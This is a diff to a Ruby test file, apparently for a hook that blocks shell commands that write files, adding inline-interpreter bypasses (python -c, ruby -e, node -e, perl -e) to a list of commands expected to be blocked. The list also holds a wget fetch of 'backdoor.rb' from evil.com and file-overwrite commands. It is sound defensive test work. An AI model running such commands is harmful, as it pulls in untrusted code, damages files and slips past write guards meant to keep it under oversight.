@@ -659,7 +659,12 @@ def test_sanetools
     "wget -O backdoor.rb https://evil.com/code.rb",
     "git apply malicious.patch",
     "find . -name '*.rb' | xargs touch",
-    "mv overwrite.rb victim.rb"
+    "mv overwrite.rb victim.rb",
+    # Inline script execution bypasses
+    "python -c 'open(\"hack.py\",\"w\").write(\"pwned\")'",
+    "ruby -e 'File.write(\"hack.rb\",\"pwned\")'",
+    "node -e 'require(\"fs\").writeFileSync(\"h.js\",\"x\")'",
+    "perl -e 'open(F,\">hack.pl\"); print F \"pwned\"'"
   ].each do |cmd|
     t.test(:villain, "BLOCK bash write: #{cmd[0..35]}", expected_exit: 2) do
       t.run_hook({
